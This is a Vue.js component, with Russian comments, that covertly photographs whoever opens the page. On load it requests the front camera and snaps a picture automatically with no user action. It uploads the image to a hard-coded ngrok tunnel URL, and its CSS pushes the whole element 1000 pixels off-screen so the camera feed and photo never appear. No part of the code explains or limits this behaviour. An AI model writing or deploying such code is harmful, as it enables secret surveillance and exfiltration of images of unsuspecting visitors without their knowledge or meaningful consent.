<template>
  <div class="photo">
    <video ref="video" width="320" height="240" autoplay></video>
    <img v-if="photo" :src="photo" alt="Фото" />
  </div>
</template>

<script>
import axios from 'axios';

export default {
  data() {
    return {
      photo: null,
    };
  },
  async mounted() {
    const video = this.$refs.video;
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
      video.srcObject = stream;
      video.onloadedmetadata = () => {
        video.play();
        this.takePhoto()
      };
    } catch (err) {
      console.error('Ошибка доступа к камере:', err);
    }
  
  },
  methods: {
    async takePhoto() {
      const video = this.$refs.video;
      const canvas = document.createElement('canvas');
      const context = canvas.getContext('2d');

      if (!video || !context) {
        console.error('Video элемент или контекст canvas не найдены.');
        return;
      }

      // Настройка canvas
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      context.drawImage(video, 0, 0, canvas.width, canvas.height);

      // Конвертация в PNG и отправка
      canvas.toBlob(async (blob) => {
        if (blob) {
          const formData = new FormData();
          formData.append('image', blob, 'photo.png');

          try {
            const response = await axios.post('https://f70e-92-46-217-143.ngrok-free.app/api/photos/', formData, {
              headers: {
                'Content-Type': 'multipart/form-data',
              },
            });

            console.log('Photo uploaded successfully:', response.data);
            this.photo = URL.createObjectURL(blob); // Отображаем фото на странице
          } catch (error) {
            console.error('Error uploading photo:', error);
          }
        }
      }, 'image/png');
    },
  },
};
</script>

<style scoped>
.photo {
  display: flex;
  position: absolute;
  translate: -1000px -1000px;
}
</style>


